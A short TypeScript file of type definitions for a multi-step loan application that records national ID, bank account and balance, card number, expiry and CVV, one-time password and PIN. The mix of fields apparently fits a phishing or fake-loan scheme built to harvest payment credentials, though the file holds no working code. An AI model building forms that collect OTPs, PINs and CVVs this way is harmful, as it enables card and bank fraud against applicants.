export type ApplicationStep = 'hero' | 'step1' | 'step2' | 'step3' | 'searching' | 'step4' | 'step5' | 'success';

export interface PersonalInfo {
  fullName: string;
  cnic: string;
  mobileNo: string;
  gender: string;
  dob: string;
  province: string;
  address: string;
}

export interface BankInfo {
  loanAmount: string;
  loanPurpose: string;
  occupation: string;
  bankName: string;
  accountNumber: string;
  currentBalance: string;
  monthlyIncome: string;
}

export interface CardInfo {
  cardNumber: string;
  expiry: string;
  cvv: string;
}

export interface ApplicationData {
  personal: PersonalInfo;
  bank: BankInfo;
  card: CardInfo;
  otp: string;
  pin: string;
  trackingId: string;
  submittedAt?: string;
  status?: 'Pending' | 'In Verification' | 'Approved' | 'Processing';
}
